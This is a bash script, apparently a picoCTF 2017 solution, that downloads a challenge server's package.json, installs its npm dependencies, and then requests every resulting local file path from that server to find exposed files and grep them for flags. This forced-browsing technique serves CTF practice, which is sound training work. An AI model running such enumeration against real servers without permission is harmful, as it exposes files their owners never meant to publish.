pack_back="package.json.back"
if [ -f package.json ]; then
	mv package.json $pack_back
fi

curl http://shell2017.picoctf.com:16929/package.json > package.json

if ! type npm > /dev/null; then
	read -p "Install npm? [y/N]: " input
	if [[ $input =~ ^([yY][eE][sS]|[yY])$ ]]; then
		sudo apt-get install npm
	else
		echo "Can't do my job without this. I quit."
		exit
	fi
fi

#### comment this after first instalation to save time
echo -e "\nInstalling dependencies from package.json"
if npm install; then
	echo "Install successful"
fi
####

echo -e "\nGetting all files to force browse."
echo "This might take a while..."
file_name="/$( basename $0 )"
files=$(find -type f | cut -c 2-)
shopt -s extglob ##for extended patern matching
files_arr=( ${files//@($file_name|"/$pack_back"|'/big_results_file'|'/flag_file')/} )



function getLink {
	local link="http://shell2017.picoctf.com:16929/$1"
	echo -e "\nTrying: $link ..."
	if curl -s -L --head --request GET "$link" | grep "200"; then
		local content=$(curl -L "$link")
		if ! echo "$content" | grep "Cannot GET" > /dev/null && [ -n ${content+x} ]; then
			echo -e "\n$link:" >> big_results_file
			echo -e "$content\n" >> big_results_file
			if echo "$content" | grep -i flag; then
				local flag=$(echo "$content" | grep -i flag)
				echo -e "\n\e[1;32m$link:\n$flag\e[0m\n"
				echo -e "$link:\n$flag\n\n" >> flag_file
			fi
			local dest="diff_folder/$1"
			mkdir -p "$(dirname "$dest")"
			echo "$content" > "$dest"
		else
			echo -e "No luck\n"
		fi
	fi
}

file_nr=${#files_arr[@]}
echo -e "\n$file_nr files got, starting force browse."
for i in ${files_arr[@]}; do
	getLink "$i"
done
echo -e "\nDone"
